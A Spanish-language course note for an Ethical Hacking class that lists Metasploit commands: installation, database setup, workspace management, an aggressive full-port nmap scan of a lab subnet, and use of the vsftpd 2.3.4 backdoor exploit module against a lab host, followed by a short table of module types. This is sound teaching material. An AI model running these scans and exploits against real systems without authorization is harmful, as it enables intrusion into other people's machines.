---
tipo: comando
categoria: Seguridad
cursos: ["[[Ethical Hacking]]"]
aliases: [msfconsole]
tags: []
---

# Metasploit

```bash
sudo apt update && sudo apt install metasploit-framework
sudo msfdb init
sudo msfconsole
```

## Dentro de msfconsole

```text
db_status
workspace                 # listar
workspace -a tecsup1      # crear
workspace tecsup1         # usar
db_nmap -Pn -sS -p- -A 10.0.2.0/24
hosts -c address,os_name
services -c port,name
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
set RHOSTS 10.0.2.10
set PAYLOAD <payload>
run
db_export -f xml /root/tecsup1.xml
```

| Módulo | Uso |
|---|---|
| exploits | Atacan una vulnerabilidad; siempre llevan payload |
| auxiliary | Escáneres, fuzzers, sniffers; sin payload |
| payloads | Código que se ejecuta en el objetivo |

Clase: [[EH U04 - Hacking de sistemas]]
